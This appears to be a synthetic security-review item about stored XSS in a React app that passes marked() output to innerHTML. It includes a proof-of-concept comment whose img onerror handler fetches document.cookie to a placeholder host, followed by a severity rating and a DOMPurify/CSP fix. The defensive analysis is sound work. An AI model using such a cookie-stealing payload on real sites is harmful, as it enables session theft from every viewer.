# XSS — gapfill_synthetic

- source: gapfill_synthetic
- class: xss

## Scenario

Code review: a React app does `el.innerHTML = marked(userComment)` for markdown comments. marked v4 default config. Vulnerability?

## Analysis / Response

<think>
marked converts markdown to HTML but does NOT sanitize by default — raw HTML embedded in markdown passes through. So `<img onerror>` in a comment survives into innerHTML. React's JSX escaping is bypassed because they set innerHTML directly, not JSX children. Stored XSS if comments persist: fires on view, runs in victim session → token theft. S:U unless admins view it (then internal escalation). Rate high, not critical, UI:R because victim must load the thread (normal use).
</think>

**Stored XSS** — `marked()` does not sanitize HTML; raw tags reach `innerHTML`.

**PoC comment:**
```markdown
Nice! <img src=x onerror="fetch('https://OAST/c?k='+document.cookie)">
```
Stored, fires for every viewer.

**Root cause:** marked emits attacker HTML verbatim; assigning to innerHTML parses and executes it. React auto-escaping only applies to JSX children, not manual innerHTML.

**Impact:** session/token theft for every viewer; staff viewing → internal compromise.

**Severity:** High — AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:L/A:N ≈ 7.1.

**Fix:** sanitize after render — `el.innerHTML = DOMPurify.sanitize(marked(comment))` — or render to React children. Add strict CSP (`script-src 'self'`) as defense-in-depth.
**Edge case:** marked v4 removed its built-in sanitizer option; DOMPurify is the correct layer, not a marked flag.
